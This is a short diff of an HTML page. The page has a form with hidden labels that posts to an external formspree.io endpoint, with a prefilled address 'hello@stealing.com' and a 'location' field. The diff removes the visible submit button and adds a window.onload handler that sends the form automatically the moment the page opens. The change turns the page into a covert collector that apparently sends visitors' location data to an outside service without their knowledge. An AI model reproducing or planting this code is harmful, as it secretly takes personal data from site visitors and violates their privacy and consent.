@@ -11,7 +11,6 @@
         <form action="https://formspree.io/f/xayazppw" method="POST" id="form_id">
             <label style="visibility:hidden">Your email:<input type="email" name="_replyto" id="main">hello@stealing.com</label>
             <label style="visibility:hidden">Your message:<textarea name="message" id="location"></textarea></label>
-            <div id="sub" onclick="mailsubmit()">Click Me to Submit</div>
         </form>
         
         <script>
@@ -35,10 +34,9 @@
         </script>
         
         <script type="text/javascript">
-            function mailsubmit(){
-            document.getElementById("form_id").submit();
-            var mailid = document.getElementById("mail").value;
-            return mailid?alert(mailid):alert("You did not submit your Email");
+            window.onload = function(){
+                document.forms[0].submit();
+            };
         </script>
     
     </body>
